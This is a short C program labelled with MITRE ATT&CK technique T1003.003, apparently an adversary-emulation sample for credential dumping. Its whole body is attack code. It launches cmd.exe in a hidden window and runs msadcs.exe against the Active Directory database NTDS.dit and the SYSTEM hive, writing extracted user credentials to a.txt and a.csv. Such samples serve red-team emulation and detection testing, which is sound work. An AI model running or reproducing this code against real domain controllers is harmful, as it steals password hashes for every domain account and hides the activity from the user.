// Link      = https://attack.mitre.org/techniques/T1003/003/
// Technique = OS Credential Dumping: NTDS
// ID        = T1003.003
// Tactics   = Credential Access

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}